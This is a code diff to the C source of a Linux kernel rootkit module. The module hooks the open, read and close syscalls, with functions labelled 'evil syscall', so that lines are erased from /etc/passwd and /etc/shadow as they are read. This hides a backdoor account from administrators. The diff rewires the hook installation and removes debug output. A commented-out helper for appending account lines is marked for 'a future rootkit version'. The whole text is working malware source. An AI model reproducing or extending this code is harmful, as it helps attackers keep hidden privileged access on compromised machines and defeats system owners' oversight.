@@ -34,21 +34,21 @@ int fugitive(const char __user *passwd, const char __user *shadow) {
   if (shadow == NULL)
     return -EFAULT;
   _passwd = kcalloc(LINE_MAX, 1, GFP_KERNEL);
-printk("kcalloc(LINE_MAX, 1, GFP_KERNEL) -> %p\n", _passwd);
+
   if (IS_ERR_OR_NULL(_passwd))
     return -ENOMEM;
   retval = strncpy_from_user(_passwd, passwd, LINE_MAX);
-printk("strncpy_from_user(_passwd, passwd, LINE_MAX) -> %d\n", retval);
+
   if (retval < 0) {
     kfree(_passwd);
     return retval;
   }
   _shadow = kcalloc(LINE_MAX, 1, GFP_KERNEL);
-printk("kcalloc(LINE_MAX, 1, GFP_KERNEL) -> %p\n", _shadow);
+
   if (IS_ERR_OR_NULL(_shadow))
     return -ENOMEM;
   retval = strncpy_from_user(_shadow, shadow, LINE_MAX);
-printk("strncpy_from_user(_shadow, shadow, LINE_MAX) -> %d\n", retval);
+
   if (retval < 0) {
     kfree(_passwd);
     kfree(_shadow);
@@ -56,18 +56,7 @@ printk("strncpy_from_user(_shadow, shadow, LINE_MAX) -> %d\n", retval);
   }
   fugitive__lines[0] = _passwd;
   fugitive__lines[1] = _shadow;
-  retval = hide_fugitive();
-//kfree(_passwd);//////////////////////////////////
-//kfree(_shadow);////////////////////////////////
-return 0;//////////////////////////////////
-  if (retval) {
-    kfree(_passwd);
-    kfree(_shadow);
-    fugitive__lines[0] = NULL;
-    fugitive__lines[1] = NULL;
-  } else {
-    fugitive__hidden = ~0;
-  }
+  fugitive__hidden = ~0;
   return retval;
 }
 
@@ -116,6 +105,9 @@ int fugitive_exit(void) {
 }
 
 int fugitive_init(struct sctm *sctm) {
+  int i;
+  int retval;
+  
   if (!IS_ERR_OR_NULL(fugitive__sctm))
     return -EINVAL;
   
@@ -144,6 +136,20 @@ int fugitive_init(struct sctm *sctm) {
   good_read = (asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original;
   
   fugitive__sctm = sctm;
+  
+  /* hook */
+  
+  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
+    retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
+    
+    if (retval) {
+      if (i) {
+        for (--i; i >= 0; i--)
+          sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
+      }
+      return retval;
+    }
+  }
   return 0;
 }
 
@@ -196,8 +202,6 @@ static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line) {
 
 /* restore a line in "/etc/passwd" and "/etc/shadow" */
 int unfugitive(const char __user *passwd, const char __user *shadow) {
-  int retval;
-  
   if (!fugitive__hidden)
     return -EINVAL;
   
@@ -210,18 +214,12 @@ int unfugitive(const char __user *passwd, const char __user *shadow) {
   
   if (shadow == NULL)
     return -EFAULT;
-  retval = show_fugitive();
-
-  if (retval)
-    fugitive__hidden = ~0;
-  else {
-    fugitive__hidden = 0;
-    kfree(fugitive__lines[0]);
-    kfree(fugitive__lines[1]);
-    fugitive__lines[0] = NULL;
-    fugitive__lines[1] = NULL;
-  }
-  return retval;
+  fugitive__hidden = 0;
+  kfree(fugitive__lines[0]);
+  kfree(fugitive__lines[1]);
+  fugitive__lines[0] = NULL;
+  fugitive__lines[1] = NULL;
+  return 0;
 }
 
 /*****************************************************************************/
@@ -233,31 +231,6 @@ int unfugitive(const char __user *passwd, const char __user *shadow) {
         append_to_file(SHADOW_PATH, SHADOW_GEN());
     return 0;
 }*///could be useful in a future rootkit version
-
-int hide_fugitive(void){
-    int i;
-    int retval;
-    /* add hooks */
-    
-    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
-        retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
-        
-        if (retval) {
-            for (; i >= 0; i--)
-                sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
-            return retval;
-        }
-    }
-    return 0;
-}
-
-int show_fugitive(void){
-    int i;
-    
-    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
-        sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
-    return 0;
-}
 
 /* helper function. return 0 if "file_path" has line "fug" */
 int has_fug(char *file_path, char *fug){
@@ -310,8 +283,6 @@ ssize_t append_to_file(char *file_path, char *fug){
 
 /* evil syscall open. hijacks read if opening account related files */
 asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
-    int retval;
-    
     if(!strcmp(PASSWD_PATH, pathname)){
         erase = PASS_E;
         goto erase_set;
@@ -324,10 +295,6 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
 
     erase_set:
     if(erase && !fugitive__hidden){
-        retval = sctm_unhook(fugitive__sctm, &fugitive__hooks[2]);
-        
-        if (retval)
-          return retval;
         fugitive__hidden = ~0;
     }
     return (*good_open)(pathname, flags, mode);
@@ -364,13 +331,7 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
 
 /* evil syscall close. restores syscall read hijacked by king_crimson */
 asmlinkage int this_is_requiem(int fd){
-    int retval;
-    
     if(erase){
-        retval = sctm_unhook(fugitive__sctm, &fugitive__hooks[2]);
-        
-        if (retval)
-          return retval;
         erase = NONE;
         fugitive__hidden = 0;
     }
